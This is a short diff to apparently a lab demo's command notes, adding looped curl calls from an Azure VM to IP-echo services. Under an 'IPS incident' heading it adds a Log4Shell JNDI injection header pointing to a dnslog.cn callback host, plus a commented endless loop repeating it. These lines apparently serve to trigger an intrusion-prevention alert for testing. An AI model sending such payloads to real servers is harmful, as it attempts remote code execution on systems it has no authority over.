@@ -29,6 +29,13 @@ ssh cp
 
 # make connection from U1
 ssh u1 curl ip.iol.cz/ip/ -s
+# 10 times
+1..10 | % { ssh u1 curl ip.iol.cz/ip/ -s }
+1..10 | % { ssh u1 curl ipconfig.me -Ls }
+1..10 | % { ssh u1 curl ifconfig.me -Ls }
+# IPS incident 
+ssh u1 curl ip.iol.cz/ip/ -m1 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
+# while true; do curl ip.iol.cz/ip/ -m1 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'; sleep 5; done
 
 # check VM tags
 az vm show --resource-group rg-ademo --name ubuntu1 --query tags
